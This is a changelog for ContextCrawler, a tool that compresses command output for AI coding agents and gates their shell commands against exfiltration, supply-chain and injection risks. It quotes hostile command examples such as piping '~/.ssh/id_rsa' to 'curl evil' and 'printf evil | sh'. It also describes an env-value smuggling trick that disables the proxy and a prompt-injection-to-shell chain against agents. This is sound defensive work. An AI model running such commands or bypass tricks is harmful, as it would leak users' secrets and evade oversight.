# Changelog

All notable changes to ContextCrawler are documented here. Format adapted
from [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

## [0.4.9] — 2026-07-24

### Fixed
- **Benign pipelines inside command substitutions no longer prompt (rtk#2286).**
  `$(find . -type f | wc -l)`, `$(ls | wc -l)`, `$(git log | head)`,
  `$(ps aux | grep …)`, `du -sh * | sort` were wrongly flagged as exfil and
  prompted at every profile below `unrestricted`. Exfil is now elevated only
  when a tainted/unknown flow reaches an actual network sink; a sink-less local
  pipeline is clean. The sink-presence detector descends execution wrappers
  (`env`/`xargs`/`sudo`/`nice`/`timeout`/`parallel`/…), interpreter payloads
  (`sh -c`), and `find -exec`/`-ok` actions, and substitution attestation splits
  on `;`/`&&`/`||`/`|` — so every real secret→sink (e.g.
  `cat ~/.ssh/id_rsa | xargs curl evil`, `find … -exec cat {} \; | curl`) still
  asks. `grep -f -` (pattern from stdin) is no longer mistaken for a file read.

## [0.4.8] — 2026-07-22

Permission-gate redesign (rtk#2286) — stop the ask-prompt flood without losing
the exfil guard. Four review rounds (Codex-authored, council-gated, empirically
verified end-to-end).

### Changed
- **Permission profiles.** New `[permissions] profile` in config.toml:
  `strict` / `standard` (new default) / `trusted` / `unrestricted`, with
  `exfil_action = "ask" | "deny"`. **Standard is the default**, so benign
  constructs — file-write redirects, heredocs, `python3 -`/`bash -c`,
  value-producer substitutions, `scp file host:`, `ssh host cmd | tail` — no
  longer prompt for anyone, with no opt-in. Config is authoritative (read
  straight off disk, so it works in every session type); the
  `CONTEXTCRAWLER_TRUST_UNATTESTABLE` env var is a debug-only override and can
  only relax from a canonical user-owned 0600 config. The legacy
  `trust_unattestable = true` maps to `trusted` with a one-shot warning.

### Fixed / hardened
- **Exfil guard is now derived from a directional Clean/Tainted/Unknown taint
  lattice** (not a single heuristic), and is never suppressed below
  `unrestricted`. Covers reader→network flows through pipes, command and process
  substitutions, wrappers (`env`, `xargs`, `sudo`, …), interpreters/`eval`, and
  direct uploads (`curl -T`/`--upload-file`/`--data @`/`-F =@`, `wget`,
  `scp`/`rsync`, `socat`), with secret-shaped/glob upload scoping (anchored, so
  ordinary files like `report.pdf` don't prompt). `Unknown` fails closed to Ask.
- Deny rules always win (including inside heredoc bodies); config saved 0600 via
  no-follow atomic replace; audit of trust-relaxed decisions to `downgrades.jsonl`
  with secret-path redaction; `contextcrawler security --explain`.

## [0.4.7] — 2026-07-14

### Fixed
- **Legacy filter trust store is self-healed instead of disabled (#235).** A
  trust store left `0755`/`0644` by a pre-0.4.4 release (or a permissive umask)
  tripped the strict owner-only validator, printing `trust store unreadable ...
  treating all filters as untrusted` on every command and silently disabling
  custom-filter trust (built-in filters and the Tirith/supply-chain gates were
  unaffected). ContextCrawler now tightens an owner-owned store to `0700`/`0600`
  on read — descriptor-based (fchmod on the O_NOFOLLOW file fd; a fresh
  `O_NOFOLLOW|O_DIRECTORY` open then fchmod for the directory), so no symlink
  swap can redirect it. The owner-only requirement is unchanged; foreign-owned
  or symlinked stores are still rejected, and permissions are only ever
  tightened.

## [0.4.6] — 2026-07-14

Supply-chain gate hardening — the last of the security audit register
(#210-#233). Three Codex-authored rounds in an isolated lane, each
driver-verified and non-author-council-reviewed. The gate remains **default-off**
(`supply_chain.enabled`).

### Fixed
- **Install-detection evasions (#227).** A gate-disable in command text is
  ignored; shell words are reconstructed before classification (quoted-fragment
  concatenation); per-manager global options are consumed before the install
  verb; process substitutions and `bash -c` recursion are inspected (a
  tokenisation error fails closed to unvettable, not silently dropped);
  line-continuations are joined while bare newlines stay command boundaries;
  `npx`/`pnpx`/`yarn dlx` launchers and `pnpm --frozen-lockfile`/bare lockfile
  installs are treated as unvettable.
- **Fail-open verdicts (#228).** OSV errors return Unavailable (not a silent
  Allow); remote PyPI/VCS/wheel URLs (incl. quoted, `git+http(s)`/`git+ssh`, and
  SCP `user@host:path` with any username) are unvettable and separated from
  local editables; pip/uv network-trust and index flags (`--trusted-host`,
  `--cert`, `--client-cert`, `--proxy`, `--index-url`, `--extra-index-url`,
  `--find-links`) force unvettable (closes a MITM/mirror bypass); an
  unauthenticated mutable cache can force a conservative Block but never justify
  an Allow; all findings and logs are credential-safe (host/basename only);
  UTF-8 suffix handling is boundary-safe; scrub/audit writes use O_NOFOLLOW
  reads, in-directory atomic temp files, and 0600.
- **429 DoS + cache trust (#231).** HTTP 429 joins 5xx/transport on the bounded
  retry/backoff path; cache files are 0600; implausible far-past publish
  timestamps are rejected.

## [0.4.5] — 2026-07-14

P0 hotfix for a self-inflicted regression in 0.4.4.

### Fixed
- **Hook integrity gate no longer disables ContextCrawler when other PreToolUse
  hooks coexist (#234).** 0.4.4's #219 hardening treated any sibling Bash hook
  (git-hygiene, lab-repo-guard, ...) as tampering and refused to run, taking the
  Tirith + supply-chain gates down with it and falling back to raw passthrough
  on every command. The runtime gate now validates ContextCrawler's *own*
  registration and ignores unrelated third-party hooks (Claude Code's
  settings-trust boundary). Hardened over two council rounds:
  - ownership is decided by the parsed executable basename, not a substring
    (a hook named e.g. `smartkit.sh` is no longer mis-flagged);
  - the install identity binds the `matcher` and hook `type` for our own
    entries only (a `Bash`->`Read` move or a `command`->`prompt` swap is caught;
    unrelated hook edits do not invalidate the baseline), serialised
    unambiguously;
  - a valid registration with no recorded baseline runs and records the
    identity on first use (trust-on-first-use) instead of hard-bailing, so
    upgrades are never bricked while a later swap of our own entry is still
    caught. A failure to record is surfaced on stderr.

## [0.4.4] — 2026-07-14

Large security release — the remainder of the codex-5.6-max sweep + 5-voice
council audit register (#210-#233). Every fix TDD'd and council-gated; the two
big clusters were done by the Codex (gpt-5.6) worker in isolated worktrees and
independently verified + non-author-council-reviewed before merge.

### Fixed
- **Hook-tamper validation rebuilt (#219, #220).** Prefix/substring hook-command
  validation (the auto-allow surface validating itself) replaced with a closed
  single-argv validator; symlink resolve-and-validate (accepts Homebrew's
  bin->Cellar, rejects a trusted-prefix symlink to an untrusted target); every
  PreToolUse entry gates the whole registration; an install-time SHA-256
  registration identity is persisted and enforced independently of the mutable
  hook; O_NOFOLLOW descriptor reads and atomic temp+rename throughout; trust
  store hardened (private dir, 0600, no-follow, owner/mode).
- **Non-Claude hook handlers gated (#225).** VS Code, Copilot-CLI and Gemini
  handlers now run the Tirith + supply-chain gates and honour Ask/Deny (fail
  closed on the no-ask hosts) instead of silently skipping.
- **Permission-gate + lexer hardening (#212-#218, #230).** Deny/allow match the
  resolved command word (after env assignments, redirections, shell prefixes);
  command-substitution and stdin/heredoc-interpreter payloads attest or Ask;
  reader->network->interpreter and process-substitution compositions taint to
  Ask; wildcard-free allow rules require token equality; policy-file failures
  fail closed; lexer closes shell-grammar gaps ($'...', backslash-newline, |&,
  grouped pipelines, arithmetic-exec, env-assignment/persistent redirects) and
  bounds nested-substitution DoS.
- **Tirith gate deadlock (#211).** Stdout is drained concurrently with the wait
  (a >64KiB verdict no longer blocks and fails open); an overflow fails closed.
- **Config policy-injection (#222).** Config is read from a validated,
  O_NOFOLLOW, user-owned, non-world-writable file (TOCTOU-safe) and the
  current-directory fallback is dropped; a hostile XDG_CONFIG_HOME or symlinked
  config is ignored in favour of safe defaults.
- **Filter engine (#226, #232, #233).** Whole-blob ANSI/OSC state-machine
  sanitisation (drops unterminated control strings across lines); CTXCRL_TOML_DEBUG
  logs a redacted name not the raw command; AggressiveFilter counts the
  signature brace; hard byte ceiling before materialisation; Go/JS/Python
  language-parsing fixes; bounded user regex (ReDoS).

## [0.4.3] — 2026-07-13

Security release. Closes a 0.4.2 regression and four bypasses from the
codex-5.6-max sweep + 5-voice council audit (register #210-#233). All fixes
TDD'd and council-gated.

### Fixed
- **Tirith `pipe_to_interpreter` bypass regression (#210).** The #191 rework
  left a whole-command `python -m json.tool` shortcut, so
  `printf evil | sh; python3 -m json.tool x` re-opened the pipe-to-interpreter
  bypass. Removed the shortcut; the source-gated sink scanner already handles
  legitimate `json.tool` data pipes.
- **Env-prefix proxy-disable injection (#229).** A quoted env value with an
  embedded space (`FOO="bar RTK_DISABLED=1" cmd`) smuggled a standalone
  `RTK_DISABLED`/`CTXCRL_DISABLED` and disabled the proxy. Now parsed with
  shell-word semantics and the whole command-substitution/expansion
  metacharacter class is rejected in the disable prefix.
- **Project-filter GLOB injection (#224).** GLOB metacharacters (`* ? [`) in a
  project directory name acted as wildcards, leaking sibling projects' history.
  Metacharacters are now escaped; only the trailing wildcard is literal.
- **`trust` symlink secret-exfil (#221).** `contextcrawler trust` read
  `.ctxcrl/filters.toml` following symlinks, so a committed symlink to a secret
  was printed and trusted. Now an `O_NOFOLLOW` no-follow read (atomic on
  Linux/macOS) refuses symlinked filter files.
- **Unscrubbed parse-failure error text (#223).** `record_parse_failure`
  persisted `error_message` verbatim; a parser error echoing the command leaked
  credentials into history. It is now scrubbed like the command.

## [0.4.2] — 2026-07-13

Security-precision and analytics-honesty release. Rebuilds the Tirith
`pipe_to_interpreter` false-positive filter around the pipe source, and corrects
the `gain` savings headline to the host-truncated counterfactual.

### Fixed
- **Tirith `pipe_to_interpreter` false positives (#191).** The gate downgraded
  almost every local data-parsing pipe (`grep … | python3 -c "json.load(…)"`) to
  an Ask. Suppression is now gated on the pipe SOURCE, not the program body:
  a finding is a false positive only when no producer anywhere in the command
  fetches remote content (fetcher denylist + URL/`/dev/tcp` scan) AND every
  interpreter sink runs an explicit program (`-c`/`-e`/`-m`/script). Body
  screening remains defence-in-depth only, since proving an arbitrary program
  body benign by pattern is undecidable. Eight rounds of council review closed
  every bypass (bundled getopt flags, `exec`/`eval` aliasing, wrapper-hidden and
  assignment-carried fetchers, `/dev/stdin` script paths, xargs interpolation,
  bash `/dev/tcp`). Measured 56.9% reduction in false prompts on real usage;
  all genuine `curl … | sh` shapes still prompt.
- **`gain` savings counterfactual (#208).** The headline divided
  `saved / raw_output`, but the host truncates a command's output before the
  model sees it, so a few huge outputs inflated the figure. `gain` now reports
  an EFFECTIVE metric that caps each command's input at the host's output limit
  (`[tracking] host_truncation_tokens`, default 7500 ≈ 30000 chars), with the
  raw figure kept beneath for reference. Raw recording is unchanged ground
  truth; JSON export carries the effective fields.
- **`read` line-range flags (#207, tracked).** Recorded for a follow-up: agents
  passing `--start-line`/`--end-line` currently fall back to raw.

## [0.4.1] — 2026-07-01

Hardening + compatibility release. Adds support for Claude Code's newer hook
payload schema, closes a hook-gating bypass surfaced in council review, and
lands several output-fidelity fixes.

### Fixed
- **Claude Code new hook schema.** The hook now accepts the newer
  `tool` + `input.command` payload alongside the legacy
  `tool_name` + `tool_input.command`. The active schema is selected by the tool
  discriminator (not field presence), and the shell hook (`rtk-rewrite.sh`) is
  now a thin delegator to the Rust binary — a single, tested source of truth
  for schema selection and gating. Conflicting discriminators, mismatched or
  partial dual-schema payloads, non-string commands, unmodeled command
  containers, and unparseable/non-object payloads all fail closed. (#2493)
- **Machine-readable git output.** `git status --porcelain`/`-z` and
  `git log --format`/`--pretty=format:` now pass through unfiltered, so tooling
  that consumes that output is never mangled.
- **Shell builtins under the proxy.** `contextcrawler cd /x`, `rtk export …`
  and other side-effecting builtins are stripped of the redundant prefix —
  standalone and inside compound commands — so the builtin runs in the current
  shell and its effect survives. (#2508)
- **`rg`/`grep` split** into separate rewrite rules; `rg` now rewrites to
  `contextcrawler rg`.
- **First-run global init** creates the parent directory before the atomic
  write, fixing a failure when the target directory does not yet exist. (#2519)

### Internal
- Refreshed the branding-lint allowlist after a test rename; `.cptr/` agent
  logs are now git-ignored.

## [0.4.0] — 2026-06-07

The library pivot: ContextCrawler is now a proper lib + bin. The binary is a thin
shim over `contextcrawler::run()`, so the CLI dogfoods the exact library code path
downstream Rust tools embed. Completes the community request in PR #185.

### Added
- Public embedder API (experimental, NOT yet semver-guaranteed):
  `filter_output(name, raw)` and `auto_filter_output(raw)` apply a named /
  auto-detected output filter to captured command output without spawning the
  CLI (panic-safe; mirrors `contextcrawler pipe`); `available_filters()` lists
  the names. Plus the existing `summarize_command_output` / `no_bloat`.
- Crate-level rustdoc with a usage example and an experimental-API banner.

### Changed
- `src/main.rs` is now a 5-line shim; all CLI logic lives in the library
  (`cli::run`). `src/lib.rs` is the sole module root with a curated public
  surface; internal modules are private (`core` is `#[doc(hidden)]`).
- One compile tree (no duplicate bin/lib trees): dead-code warnings 473 -> 0,
  so unused code is now genuinely flagged.

### Notes
- The public API is intentionally small and unstable at 0.x; it will be
  stabilised toward 1.0. No CLI behaviour change in this release.

## [0.3.0] — 2026-06-06

Branding rename: rtk/contextzip -> ctxcrl/contextcrawler throughout. The fork now
carries its own identity; upstream origins (rtk-ai/rtk, "based on rtk 0.30.1",
author attribution) are preserved as historical credit. Complete-reset sanctioned
(no external fork users) so no schema/marker back-compat is carried beyond the
env-var shim.

### Changed (breaking for local setup, shimmed)
- Env vars RTK_* -> CTXCRL_* (CTXCRL_DISABLED, CTXCRL_DB_PATH, ...). Legacy RTK_*
  still honoured via a deprecated compat shim, so existing ~/.claude hook
  integrations keep working.
- Paths -> ~/.config/ctxcrl, ~/.local/share/ctxcrl, .ctxcrl/. Settings
  (config.toml/filters) auto-migrate on first run; the savings history.db resets
  fresh (schema changed; legacy DB left orphaned).
- DB columns rtk_* -> ctxcrl_*; analytics JSON keys rtk_* -> ctxcrl_*.
- CLAUDE.md managed-block markers RTK_* -> CTXCRL_* (old blocks orphan on re-init).
- Hook integrity sidecar .rtk-hook.sha256 -> .ctxcrl-hook.sha256; hermes hook dir
  rtk-rewrite -> ctxcrl-rewrite. Public symbols Rtk* -> Ctxcrl*.

### Kept (deliberate)
- Origin/attribution refs; legacy detection of old rtk command-prefixes,
  rtk-rewrite.sh / rtk-hook / RTK.md / homebrew rtk installs; the X-RTK-Token
  telemetry wire header (telemetry is opt-out).

### Repo hygiene
- .gitignore excludes local tool metadata (.serena/, .playwright-mcp/,
  package-lock.json, cache/) so `git add -A` can't sweep them in.

## [0.2.0] — 2026-06-06

Consolidation baseline before the library/CLI pivot. Bundles the 2026-06-06
fix batch plus the first external community contribution (a library build).
This is the tagged baseline (`contextcrawler-v0.2.0`) we branch the lib pivot from.

### Security

- **Permission gate never auto-allows not-evaluable constructs** (#2286 port of
  rtk-ai/rtk 952245d + e16aa26, reconciled with the fork's &/newline split). The
  gate downgrades command/process substitution (`$()`, backticks, `<()`/`>()`)
  and real file-write redirects (`>file`, `>>file`, `>&word`, `&>file`) from
  Allow to Ask; keeps `2>&1`, `/dev/null`, arithmetic `$((..))` and input
  redirects evaluable. Centralised in `check_command_with_rules` so both the live
  hook and legacy rewrite paths inherit it.
- **Live-path Ask surfaced for non-rewritable commands.** The #2286 Ask verdict
  was silently dropped on the live hook path when a command had no rewrite,
  letting the host auto-allow e.g. `git status $(whoami)` via a `Bash(git:*)`
  rule. The no-rewrite branch now emits an explicit `ask` whenever the verdict is
  Ask (not only on a defence-in-depth gate). Found by empirical testing of the
  built binary.

### Fixed

- **tsc / mypy / next build no longer report success on a failed run.** These
  filters printed "no errors"/a fake summary and discarded the real error text
  when the wrapped command failed. A shared `format_tool_failure` surfaces raw
  output on a non-zero exit. (Exit-code propagation was already correct.)

### Performance

- **grep / find pipe wrappers: ~40% → ~67% token savings.** grep now shows 5
  sample matches plus a compact comma-joined list of *every* remaining match's
  line number (more locational signal, fewer tokens); find caps samples at 5.
- **Decorator noise stripped from filter output** (#2289 port) — box-drawing
  `═══` separators, `--- x ---` dash headers, and `❌`→`✗` removed from
  LLM-bound output across ~16 filters. Dashboard/TTY output left intact.

### Added

- **Library build (lib + bin).** The crate now exposes `summarize_command_output`
  + `CommandOutputSummaryOptions` and `no_bloat` via `src/lib.rs`, so downstream
  Rust tools can embed the summariser without spawning the CLI. First external
  community contribution — thanks to Danny Wilson (@vizanto), PR #185.
  NOTE: this is an MVP surface; the lib build currently emits dead-code warnings
  because the binary does not yet consume the library. The "CLI consumes the API"
  refactor is the headline of the next (pivot) release.

## [0.1.7] — 2026-05-18

Read-filter, grep, and downstream-rebrand cleanup release. Lands the
post-upstream-rebase fixes plus a regression-test framework
("branding lint" + three constant-pinning tests) so the rebrand can't
silently drift again on the next rebase.

### Changed

- **Read filter — symmetric 80/80 head/tail cap** (`tests/fixtures/bench`
  baseline: cap-firing case 67.1% savings on 8473-token input). Previous
  upstream default was 80/20, biasing toward the file's opening; equal
  weight to tail preserves final assertions / result lines. Plus a
  `passthrough_extensions` allowlist (e.g. `[".svelte", ".astro"]` to
  skip the cap for source files in unfiltered languages), a two-line
  marker that includes the escape hatch (`contextcrawler proxy cat <path>`
  so an LLM can self-recover full content), and stdin coverage so piping
  large files through `cat … | rtk read -` gets the same protection.
  Closes #12.
- **Grep pre-clap intercept for documented format flags.** `-c, -L, -o,
  -Z` and the long-form equivalents (`--count, --files-with-matches,
  --files-without-match, --only-matching, --null`) now route directly
  through `rg` (system `grep` fallback), bypassing clap before its
  unknown-arg error fires. Eliminates the 518 spurious parse_failures
  observed in pre-fix usage. Keeps mixed invocations like
  `grep -c --glob '*.rs' pat` working because rg understands both. `-l`
  intentionally excluded (this app's clap claims `-l` for `--max-len`).
  Closes #13.

### Fixed

- **Slim-instructions filename regression** (#19). Commit bcddd06 in
  the upstream rebase silently flipped `RTK_MD` from `CONTEXTCRAWLER.md`
  back to `RTK.md`. After-effects: `init -g --codex` wrote
  `~/.codex/RTK.md` instead of `~/.codex/CONTEXTCRAWLER.md`, orphan +
  duplicate `@`-refs accumulated in AGENTS.md, and `patch_claude_md`
  had a hardcoded `@RTK.md` literal that bypassed its own contains-check.
  Restored constants + added `cleanup_legacy_codex_files()` auto-migration
  so users upgrading from regressed installs get cleaned automatically +
  `LEGACY_RTK_MD_FILES` registry that future renames extend.
- **`--version` printed `rtk 0.39.0`** (#22) — clap derive's `name="rtk"`
  attribute overrode the package name. Now prints `contextcrawler X.Y.Z`.
- **Print-string rebrand sweep** (#20 #23). 47 `[rtk]` warning/error
  prefixes → `[contextcrawler]`, plus ~15 `RTK.md`/`@RTK.md` user-facing
  labels in print/init paths.
- **`release-please-config.json` had `package-name: "rtk"`** — would have
  produced `rtk-vX.Y.Z` tags instead of `contextcrawler-vX.Y.Z`. Plus
  Cargo.toml's `extended-description` still mentioned "rtk filters and
  compresses". Both corrected.
- **`patch_claude_md` would duplicate `@RTK.md` + `@CONTEXTCRAWLER.md`**
  on upgrade (codex review catch); legacy `@`-refs now migrate in place
  before the contains-check.
- **`uninstall_codex_at` + `show_codex_config` ignored legacy artifacts**
  (codex review catch); both now iterate `LEGACY_RTK_MD_FILES`.
- **Codex CLI compliance with `contextcrawler ` prefix rule** (#9).
  Strengthened `hooks/codex/rtk-awareness.md` template from advisory
  one-line wording to imperative MUST + WRONG/RIGHT examples + self-check
  instruction. Empirical compliance jumped from **0% → 80%** on real
  codex job logs after the new template landed.

### Added

- **`tests/branding_lint.rs`** — scope-aware lint that scans every `.rs`
  in `src/` for forbidden upstream literals (`[rtk]`, `[rtk:`, `RTK.md`,
  `@RTK.md`). Allow-marker (`// branding-lint: allow legacy`) and
  function-prefix allowlist with brace-depth tracking cover intentional
  legacy references in cleanup tests. Plus a separate config-file check
  that pins Cargo.toml's `[package].name` and release-please-config.json's
  `package-name` field to `"contextcrawler"`.
- **`tests/harness_standalone.rs`** (#29 Tier 1) — Rust integration test
  that invokes the built binary as a subprocess with `RTK_DB_PATH` set to
  an isolated tempfile (does NOT touch the user's real history.db), runs
  a fixture battery, and writes `bench/results-<git-sha>.{json,md}` for
  pre/post comparison. Baseline: 65.2% weighted savings across 4 cases
  on develop tip. Hard regression gates: cap savings ≥50%, xcstrings
  savings >0%. Tier 2 (Claude Code) + Tier 3 (Codex) deferred to
  follow-up PRs.
- **Three constant-pinning regression tests** so the next rebase can't
  silently revert today's rebrand fixes:
  `test_rtk_md_constant_pinned_to_contextcrawler_filename` (#19),
  `test_cli_name_pinned_to_contextcrawler` (#22), and
  `branding_lint_config_files_pin_canonical_package_name`.

### Internal

- Open follow-ups filed during this release cycle: #26 (uninstall
  ordering — file delete should happen after AGENTS.md write succeeds,
  low severity), #27 (`$CODEX_HOME` canonicalization — defence in
  depth), #28 (lift codex compliance from 80% → 95% via additional
  WRONG/RIGHT examples + a compliance measurement script), #29 (Tier
  2/3 of the bench harness).

## [0.1.6] — 2026-05-15

Security and maintenance release. Closes 12 audit findings from the
2026-05-15 review (extending the three GHSAs from v0.1.5 plus
downstream-only findings on the web command, supply-chain integration,
filter trust model, and tirith gate). Adds the long-term-maintenance
framework: threat model, release runbook, upstream-rebase strategy,
quality baselines, three per-module security audits, and a roadmap.

### Security

- **Build-host metadata stripped from release binaries.** Previously
  the release binary embedded ~284 `/Users/<builder>/.cargo/registry/...`
  paths used by Rust's panic-backtrace metadata, leaking the builder's
  username and directory layout. `scripts/build-release.sh` now sets
  `--remap-path-prefix` for `$CARGO_HOME` and the workspace; `--verify`
  mode asserts zero builder paths in the produced binary.

- **`strip_ansi` extended + raw-emit sweep.** `strip_ansi` already
  covered CSI; v0.1.5 added OSC / OSC 8 hyperlinks / DCS / SOS / PM /
  APC / private DEC modes. v0.1.6 sweeps 58 raw `eprint!`/`println!`
  sites across 9 files (`cmds/git/`, `cmds/cloud/`, `cmds/js/`,
  `cmds/python/`, `cmds/dotnet/`, `cmds/system/grep_cmd.rs`,
  `cmds/go/`, `core/runner.rs`) so failure-path tool output goes
  through the sanitiser before reaching the agent.

- **Global TOML filter trust gate (H-3).** `~/.config/rtk/filters.toml`
  was previously loaded with no integrity check while the project-local
  `.rtk/filters.toml` was SHA-256-pinned. Closed: same trust store,
  same content-change-revokes semantics. New CLI: `contextcrawler
  trust --global` / `untrust --global`. Plus a TOCTOU fix
  (`check_trust_bytes` works on the already-read buffer instead of
  re-opening the path between hash and parse).

- **CI trust-override now requires platform-injected token (H-2).**
  `RTK_TRUST_PROJECT_FILTERS=1` previously trusted any env that set
  `CI=true` (settable by a hostile Makefile). Tightened to also require
  a platform-injected token (`GITHUB_TOKEN`, `CI_JOB_TOKEN`,
  `BUILDKITE_AGENT_ACCESS_TOKEN`, `JENKINS_NODE_COOKIE`/`BUILD_TAG`,
  `CIRCLE_TOKEN`/`CIRCLE_BUILD_NUM`, `DRONE_BUILD_NUMBER`). An in-repo
  Makefile can't fake these.

- **Tirith subprocess hardening (F-01 / F-02 / F-04 / F-05).**
  - `wait_timeout(8s)` so a hung `tirith check` no longer freezes the
    agent's PreToolUse hook (was indefinite).
  - 4 MiB stdout cap.
  - `Stdio::null()` on stdin and stderr — the stderr pipe was never
    drained, so a noisy tirith could fill the 64 KiB kernel buffer
    and stall the wait_timeout until it fired.
  - JSON re-canonicalisation in `log_downgrade` before embedding in
    `downgrades.jsonl` — closes a log-injection vector where a
    hostile tirith could emit literal newlines to forge a top-level
    log record. Sentinel-on-parse-failure keeps the line valid JSON.
  - Same subprocess pattern applied to the `security_cmd` dashboard
    (`fetch_audit_stats`, `fetch_doctor_status`).
  - New dep: `wait-timeout = "0.2"`.

- **Web command hardening (F-01 / F-02 / F-03 / F-04 / F-07).**
  `contextcrawler web` now:
  - parses the URL with the `url` crate, rejects non-http(s)
    schemes (closes `file:///etc/passwd` local-read);
  - resolves the host and refuses if any resolved IP is in a blocked
    range (loopback / link-local / RFC1918 / ULA / CGN / multicast /
    unspecified / 0.0.0.0/8 / 198.18/15 benchmark / 240/4 future-use,
    plus IPv4-mapped-private-in-IPv6, plus Azure metadata
    168.63.129.16, plus AWS metadata 169.254.169.254 via link-local);
  - pins the validated IPs into curl via `--resolve` so curl can't
    independently re-resolve to a private IP between our check and
    the fetch (DNS-rebinding defence);
  - caps curl at `--max-time 30`, `--max-filesize 64 MiB`,
    `--max-redirs 10`;
  - uses `--` to terminate flag parsing before the URL;
  - wraps stderr in `strip_ansi`.
  - New dep: `url = "2"`.
  - Residual: multi-host-redirect (`other.example` after a redirect
    re-resolves DNS) tracked for v0.2.0.

### Process & docs

- **Threat model**: new `docs/security/THREAT_MODEL.md`. Documents
  assets, attack surfaces, threat actors, mitigations matrix,
  accepted limitations.

- **Module audits**: per-file security audits for `supply_chain_gate.rs`
  (6 findings, no High/Critical), `tirith_gate.rs` (5 findings,
  closed), `Commands::Web` dispatch + `web_cmd.rs` (6 findings,
  closed), and combined `jsonl_rewriter` + `session_compact_cmd`
  + `security_cmd` (3 Mediums, 6 LOW/INFO). Subprocess-timeout
  class-audit conclusion in `AUDIT_subprocess_timeout_class.md`.

- **Quality baselines**: `docs/quality/BASELINE.md` snapshots test
  count, clippy state, `cargo audit` result, unsafe blocks, unwrap
  distribution. `deny.toml` covers advisories, licenses, bans,
  sources (passes `cargo deny check`).

- **Release & rebase docs**: `docs/contributing/RELEASING.md`
  (end-to-end runbook) + `docs/contributing/UPSTREAM_REBASE.md`
  (rtk-ai/rtk tracking strategy, what-to-take-vs-skip matrix,
  conflict resolution for hardened paths).

- **Roadmap**: `docs/ROADMAP.md` — v0.1.x line, v0.2.0 candidates
  organised into security/process/capability buckets, tracking
  model.

- **Session record**: `docs/sessions/2026-05-15-overnight.md` —
  branch-by-branch summary with Codex round results and merge order.

### Build & infrastructure

- `rust-version = "1.80"` MSRV declared in Cargo.toml (covers
  `Ipv6Addr::to_ipv4_mapped` used by the SSRF block check).
- New scripts: `scripts/build-release.sh` (with `--verify` and
  `--install` modes), `scripts/bump-version.sh`.
- Proposed CI jobs documented in `docs/quality/CI_JOBS_PROPOSED.md`
  (release-leak gate + `cargo deny check`). Wire in when the
  `.github/` gitignore situation is resolved.

### Tests

1845+ passed across the merged tree (was 1828 at v0.1.5). 32 new
regression tests for argv-mode guard / OSC stripping / scrub /
SSRF block / CI trust check / JSONL canonicalisation.

### Acknowledgements

Three rounds of Codex peer review on each fix branch. Every
finding tracked, every fix verified.

## [0.1.5] — 2026-05-15

Security release. Three downstream-only fixes covering attack surfaces
that upstream rtk-ai/rtk has declined to address (`#640` "by design /
tracking"). Each landed on its own feature branch with full Codex peer
review (three review passes); tracked privately as GitHub Security
Advisories on `thehoff/contextcrawler` until publication.

### Security

- **GHSA-3mmh-86cm-g6w4** — `contextcrawler err / test / summary` now
  parse the trailing command as argv and exec without a shell by
  default. Shell metacharacters cause rejection; the first token is
  refused if it's a known shell (sh / bash / zsh / dash / ksh / fish /
  tcsh / csh / ash and their `.exe` variants; cmd / powershell / pwsh;
  busybox / toybox) or an exec wrapper (env / nice / nohup / time /
  timeout / gtimeout / ionice / chroot / setpriv / unshare / taskset /
  stdbuf / script / xargs / watch / sudo / doas / su / runuser /
  pkexec). `--shell` is the documented escape hatch for users who
  actually need `sh -c` semantics. Closes a prompt-injection →
  shell-injection chain where an agent could append a shell payload
  to a build-triage command and have it auto-execute.
- **GHSA-wjx4-ffxm-fxxp** — `strip_ansi` now covers OSC (including OSC 8
  terminal hyperlinks — visible text preserved, URL payload dropped),
  DCS, SOS, PM, APC, private DEC CSI modes, and standalone Fe/Fp/Fs
  escapes, on top of the existing CSI coverage. Prisma command paths
  (`run_generate` / `run_migrate` / `run_db_push`) now wrap their
  failure-fallback `eprint!` calls in `strip_ansi`. A broader audit of
  remaining raw-emit paths (git / container / dotnet / python / pnpm /
  grep) is tracked as follow-up in SECURITY.md.
- **GHSA-2cwv-rr7c-2p4c** — `scrub_secrets` redacts well-known
  credential patterns before insert into `tracking.db` (which feeds
  `gain --history` back into agent context). Covers credential-bearing
  flags (`--password` / `--token` / `--api-key` / `--secret` /
  `--access-key` / `--auth-token` / `--client-secret`, with `=value`,
  space-value, and escape-aware quoted-value forms), HTTP
  `Authorization` headers, URL-embedded `user:password@`, AWS access
  keys, GitHub PATs (classic + fine-grained `github_pat_…`), Slack
  tokens, and mysql/mariadb `-p<password>` (scoped to mysql / mariadb
  / .exe variants only — `curl -p3000` and similar are not rewritten).

### Tests

- 1828 passed, 0 failed across all three branches and the merged
  `develop`. Each fix landed with a dedicated regression-test block.



Mop-up release covering two surfaces v0.1.3 didn't touch.

### Fixed

- **`contextcrawler discover` output still printed RTK.** Banner, stats
  line, empty-state hint, section header, column header, and per-row
  "Equivalent" cells all said `RTK …` / `rtk git`. Fixed by widening the
  scope of the `display_rtk` helper from the rewrite path to the
  discover report path (made `pub`, applied at the print site in
  `src/discover/report.rs`). Internal `rtk_cmd: "rtk X"` rule literals
  in `rules.rs` are still intentionally unchanged — kept as internal
  lookup keys aligned with upstream rtk. (#7)

### Documented

- Added a design-intent comment to `process_claude_payload` clarifying
  that the Tirith and supply-chain gates only fire on the
  `PermissionVerdict::Allow` path. Future investigators won't repeat
  the false alarm of "fresh probes don't appear in `downgrades.jsonl`"
  — by design, the gate is a safety net for the auto-allow path only,
  not a universal filter. (#7)

## [0.1.3] — 2026-05-14

Polish release. Empirically surfaced via fresh-install devel-testing on
macOS and Ubuntu (Framework). v0.1.2 binaries still emitted legacy `rtk`
strings in user-facing output and tried to exec `rtk` from a CLI
fallback path that broke flag-only invocations. Internal `rtk`
identifiers (struct / module / field names, `rtk_cmd:` rule values,
`rtk_equivalent` classification keys) are intentionally retained to
keep upstream rebases against rtk-ai/rtk small.

### Fixed (correctness)

- **Hook rewrite prefix.** Every rewrite emitted `rtk <subcmd> ...` —
  on machines where only the new `contextcrawler` binary is on PATH
  (the documented install), Claude Code then failed with `command not
  found: rtk` when it tried to execute the rewritten command. The
  rewrite output now emits `contextcrawler <subcmd> ...`. Both prefixes
  are still accepted as "already-rewritten" passthrough so legacy
  `Bash(rtk:*)` allowlist entries keep working. (#1)
- **`contextcrawler -v` (and any flag-only invocation).** The CLI
  fallback path attempted to exec `args[0]` as a binary when clap
  parsing failed. With `args[0]` = `-v`, that produced a misleading
  `[rtk: No such file or directory (os error 2)]`. Now: leading-dash
  guard re-raises clap's parse error so `-v` shows the proper
  "subcommand required" message; passthrough-failure prefix is
